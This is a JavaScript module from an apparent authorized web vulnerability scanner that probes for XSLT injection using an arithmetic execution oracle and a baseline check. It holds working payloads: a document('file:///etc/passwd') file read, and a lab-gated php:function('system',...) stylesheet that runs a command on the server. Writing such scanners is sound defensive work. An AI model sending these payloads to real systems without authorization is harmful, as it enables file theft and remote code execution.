// Dark Matter rule-based scanner — XSLT injection probe (#47).
//
// NON-OVERLAP: xxe.js owns XML PARSER abuse (entities); ssti.js owns
// {{}}-template engines; traversal.js owns path inclusion. This spec owns
// STYLESHEET EXECUTION only (catalog #83).
//   D1. Surface inventory: XML endpoints, xsl/xslt/stylesheet params,
//       .xml/.xsl uploads, SOAP, processor error strings.
//   D2. Execution oracle — HIGH: 1336*7=9352 vs inert baseline.
//   D3. document('file:///etc/passwd') — CRITICAL (only when D2 confirmed).
//   D4. document() SSRF — HIGH (only when D2 confirmed, listener).
//   D5/D6. PHP php:function / .NET msxsl:script — CRITICAL (LAB-ONLY).
//   D7. Error-oracle smell — MEDIUM/INFO.
//
// Proof: unique markers only. One finding per sink at highest severity
// (no triple counting). $0, no new deps.

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function isLab(url, opts) {
  try {
    const host = new URL(url).hostname;
    return String(opts.labTargets || '')
      .split(/[,\s]+/)
      .filter(Boolean)
      .some((h) => host === h || host.endsWith('.' + h));
  } catch {
    return false;
  }
}

function ev(request, response, impact) {
  return { request, response, impact_demo: impact, signalCorrelated: true };
}

async function fetchFull(url, opts = {}, init = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 20000);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
      redirect: 'manual',
      ...init,
    });
    const text = await res.text().catch(() => '');
    return { status: res.status, text: text.slice(0, 500000), ct: res.headers.get('content-type') || '' };
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

const XSL_OPEN = '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">';
const XSL_CLOSE = '</xsl:template></xsl:stylesheet>';

function arithSheet() {
  return `${XSL_OPEN}<xsl:value-of select="1336*7"/>${XSL_CLOSE}`;
}
function baselineSheet(rid) {
  return `${XSL_OPEN}<xsl:value-of select="'DMXSLT-BASELINE-${rid}'"/>${XSL_CLOSE}`;
}

// ---- D1: surface inventory -----------------------------------------------------------------
async function d1Surfaces(url, params, opts) {
  const surfaces = [];
  const u = new URL(url);
  for (const p of params || []) {
    if (/^(xsl|xslt|stylesheet|transform|template)$/i.test(p)) {
      surfaces.push({ kind: 'param', param: p });
    }
  }
  const r = await fetchFull(url, opts);
  if (r) {
    if (/application\/xml|text\/xml/i.test(r.ct)) surfaces.push({ kind: 'xml-body' });
    // Retain the matched processor string: D7 quotes it verbatim, and the
    // raw response is discarded after this function returns.
    // NOTE: `stylesheet` is deliberately NOT in this alternation — it
    // matches every HTML page's CSS <link> tag (DVWA login-page FP,
    // 6 Nov 2026: evidence was just '<link rel="stylesheet" ...>')
    // and names no XSLT processor. Only real processor tokens fire D7.
    const errMatch = r.text.match(/libxslt|saxon|XslCompiledTransform|XSLTProcessor|javax\.xml\.transform/i);
    if (errMatch) {
      const idx = r.text.indexOf(errMatch[0]);
      surfaces.push({ kind: 'error-smell', sample: r.text.slice(Math.max(0, idx - 60), idx + 120) });
    }
  }
  void u;
  return surfaces;
}

// ---- D2: execution oracle ----------------------------------------------------------------------
async function d2Exec(url, surface, opts, rid) {
  if (surface.kind === 'param') {
    const u = new URL(url);
    u.searchParams.set(surface.param, arithSheet());
    const rPay = await fetchFull(u.toString(), opts);
    const u2 = new URL(url);
    u2.searchParams.set(surface.param, baselineSheet(rid));
    const rBase = await fetchFull(u2.toString(), opts);
    if (!rPay || !rBase) return null;
    const execProof = rPay.text.includes('9352') && !rBase.text.includes('9352');
    if (execProof) return { surface, rPay };
  } else if (surface.kind === 'xml-body') {
    const body = `<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:text/xsl,${encodeURIComponent(arithSheet())}"?><root/>`;
    const rPay = await fetchFull(url, opts, {
      method: 'POST', body, headers: { 'Content-Type': 'application/xml' },
    });
    // Baseline-gate like the param branch: a coincidental 9352 in the XML
    // body (id, timestamp) must not fire the oracle.
    const baseBody = `<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:text/xsl,${encodeURIComponent(baselineSheet(rid))}"?><root/>`;
    const rBase = await fetchFull(url, opts, {
      method: 'POST', body: baseBody, headers: { 'Content-Type': 'application/xml' },
    });
    if (rPay && rBase && rPay.text.includes('9352') && !rBase.text.includes('9352')) return { surface, rPay };
  }
  return null;
}

export async function probeXslt(url, params, opts = {}) {
  const findings = [];
  const rid = rand();
  const lab = isLab(url, opts);
  const surfaces = await d1Surfaces(url, params, opts);
  // D7: error-oracle smell even without injectable surface.
  if (surfaces.some((s) => s.kind === 'error-smell') && !surfaces.some((s) => s.kind !== 'error-smell')) {
    const smell = surfaces.find((s) => s.kind === 'error-smell');
    findings.push({
      class: 'xslt_injection',
      id: `xslt-err-${rand()}`,
      title: 'XSLT processor internals exposed via error disclosure (MEDIUM)',
      severity: 'medium',
      url,
      parameter: 'response',
      evidence: ev(
        `GET ${url} (passive)`,
        `Error text names an XSLT processor — execution NOT claimed, disclosure only: "${smell.sample}"`,
        'Processor fingerprint for XSLT attack surface.'
      ),
    });
  }
  const injectable = surfaces.filter((s) => s.kind !== 'error-smell');
  if (!injectable.length) return findings;
  let best = null; // one finding per sink at highest severity
  for (const s of injectable.slice(0, 4)) {
    const exec = await d2Exec(url, s, opts, rid);
    if (!exec) continue;
    const execIdx = exec.rPay.text.indexOf('9352');
    const execWindow = exec.rPay.text.slice(Math.max(0, execIdx - 60), execIdx + 60);
    best = {
      class: 'xslt_injection',
      id: `xslt-exec-${rand()}`,
      title: 'XSLT injection — stylesheet executed server-side (HIGH)',
      severity: 'high',
      url,
      parameter: s.param || s.kind,
      evidence: ev(
        `Stylesheet <xsl:value-of select="1336*7"/> via ${s.kind}${s.param ? ` param ${s.param}` : ''}`,
        `Response contains literal 9352 in transformed output; inert baseline did not — "...${execWindow}..."`,
        'XSLT execution primitive: file-read / code-exec chains available.'
      ),
    };
    // D3: document() file-read (only when D2 confirmed).
    if (s.kind === 'param') {
      const docSheet = `${XSL_OPEN}<xsl:value-of select="document('file:///etc/passwd')"/>${XSL_CLOSE}`;
      const u = new URL(url);
      u.searchParams.set(s.param, docSheet);
      const r3 = await fetchFull(u.toString(), opts);
      if (r3 && r3.text.includes('root:x:0:0')) {
        const idx3 = r3.text.indexOf('root:x:0:0');
        const window3 = r3.text.slice(Math.max(0, idx3 - 60), idx3 + 120);
        best = {
          class: 'xslt_injection',
          id: `xslt-doc-${rand()}`,
          title: 'XSLT injection — document() file read (CRITICAL)',
          severity: 'critical',
          url,
          parameter: s.param,
          evidence: ev(
            `Stylesheet document('file:///etc/passwd') via param ${s.param}`,
            `Verbatim root:x:0:0 in transformed output — "...${window3}..."`,
            'Arbitrary file read via XSLT document().'
          ),
        };
      }
      // D5: PHP code-exec (LAB-ONLY).
      if (lab && !best.title.includes('CRITICAL')) {
        const phpSheet = `${XSL_OPEN}<xsl:value-of select="php:function('system','echo DM_XSLTEXEC_${rid}')"/>${XSL_CLOSE}`;
        const u5 = new URL(url);
        u5.searchParams.set(s.param, phpSheet);
        const r5 = await fetchFull(u5.toString(), opts);
        if (r5 && r5.text.includes(`DM_XSLTEXEC_${rid}`) && !r5.text.includes('php:function')) {
          const idx5 = r5.text.indexOf(`DM_XSLTEXEC_${rid}`);
          const window5 = r5.text.slice(Math.max(0, idx5 - 60), idx5 + 60);
          best = {
            class: 'xslt_injection',
            id: `xslt-php-${rand()}`,
            title: 'XSLT injection — PHP function execution (CRITICAL)',
            severity: 'critical',
            url,
            parameter: s.param,
            evidence: ev(
              `Stylesheet php:function('system',...) via param ${s.param} (lab-only)`,
              `Marker DM_XSLTEXEC_${rid} executed server-side (php:function source absent) — "...${window5}..."`,
              'Remote code execution via XSLT PHP functions.'
            ),
          };
        }
      }
    }
    // D4 document() SSRF: rides the ssrf.js OOB-listener contract (documented).
    if (best) break; // one finding per sink at highest severity
  }
  if (best) findings.push(best);
  return findings;
}

export const __xsltMeta = { phases: ['xslt'], depth: ['quick', 'standard', 'deep'] };
